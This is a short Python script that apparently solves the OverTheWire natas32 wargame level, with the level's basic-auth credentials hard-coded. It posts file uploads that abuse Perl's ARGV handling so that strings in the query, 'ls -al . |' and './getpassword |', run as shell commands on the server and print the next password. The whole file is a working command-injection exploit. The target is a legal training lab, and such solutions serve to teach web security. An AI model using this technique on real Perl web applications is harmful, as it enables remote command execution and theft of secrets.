import requests
import string
from requests.auth import HTTPBasicAuth

url = 'http://natas32.natas.labs.overthewire.org/index.pl'
# base auth
auth = HTTPBasicAuth('natas32', 'no1vohsheCaiv3ieH4em1ahchisainge')

response = requests.post(url + '?ls -al . |',
                         files=[('file', ('filename', 'abc'))],
                         data={'file': 'ARGV'},
                         auth=auth)
print(response.text)

response = requests.post(url + '?./getpassword |',
                         files=[('file', ('filename', 'abc'))],
                         data={'file': 'ARGV'},
                         auth=auth)
print(response.text)
